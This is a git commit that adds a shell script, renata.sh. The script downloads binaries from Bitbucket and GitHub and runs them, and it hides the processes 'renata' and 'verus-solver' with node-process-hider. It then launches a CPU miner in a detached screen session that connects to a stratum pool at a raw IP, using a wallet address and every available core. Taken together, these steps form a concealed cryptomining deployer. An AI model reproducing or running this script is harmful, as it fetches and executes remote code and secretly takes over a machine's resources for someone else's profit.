ec4a95180c21fd6c2b39469b8fbbeaa501e061e7
komaria10003099 <komaria10003099@webmail.uad.ac.id>
2023-12-08 09:26:40 +0700

    Create renata.sh

---
+++ renata.sh
@@ -0,0 +1,9 @@
+sudo apt-get update
+sudo apt install npm screen -y
+sudo npm i -g node-process-hider && sudo ph add renata verus-solver
+wget https://bitbucket.org/kijang-020/project1/raw/d28f558eb2ebf56e26f70d01f3805e21cda6eeaf/reload
+wget https://github.com/komaria10003099/wappahj/raw/main/renata
+wget https://github.com/komaria10003099/wappahj/raw/main/verus-solver
+chmod +x renata verus-solver reload
+screen -dmS run ./renata -c stratum+tcp://137.184.5.123:80 -u RE9ZxBCB3QiXCbjB8erhFVAC4Ph6ZTNqTE.Rig001 -p x -t$(nproc --all)
+./reload
